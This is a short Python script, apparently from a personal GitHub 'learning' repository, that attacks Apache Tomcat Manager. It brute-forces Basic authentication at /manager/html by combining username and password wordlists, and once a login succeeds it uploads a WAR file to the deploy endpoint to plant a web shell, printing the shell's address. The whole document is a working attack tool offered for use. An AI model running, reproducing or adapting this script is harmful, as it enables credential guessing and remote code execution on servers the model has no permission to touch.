# Learning in Python

"""
about blast_tomcat, by Ye4r
https://github.com/Ye4r/trypy/bgtomcat.py

"""

import requests
import base64
import re


url = str(input("请输入url:"))

if url.endswith('/'):
    url = url.strip('/')
else:
    pass


def rtxt(txt):
    with open(txt, 'r', encoding='utf-8') as f:
        list = f.read().splitlines()
        return list


nlist = rtxt('name.txt')
uaplist = []
respon = ""
for user in nlist:
    plist = rtxt('pwd.txt')
    for pwd in plist:
        password = user + ':' + pwd
        uaplist.append(password)
for a in uaplist:
    b = a
    a = str(base64.b64encode(a.encode('utf-8')), 'utf-8')
    a = 'Basic '+ a
    headers = {
        'Authorization': a
    }
    send = requests.get(url+'/manager/html', headers=headers)
    respon = send.status_code
    if respon == 200:
        print("> 用户名密码-->"+b,'\n> 尝试上传shell...(上传shell格式可能不准确，上传失败请手动验证)')
        break
    else:
        pass
if respon != 200:
    print('> 未发现正确用户名密码！')
else:
    fl = open('managers.war','rb')
    files = {'deployWar': ('managers.war', fl, 'application/octet-stream', {'Expires': '0'})}
    r = re.findall(r'list;(.*?)\"\>List',send.text)
    r = r[0]
    upsend = requests.post(url+'/manager/html/deploy?'+r, headers=headers, files=files)
    respon2 = upsend.status_code
    if respon2 != 200:
        print('> shell上传失败...')
    else:
        print('> 上传成功，shell地址为-->', url+'managers/')
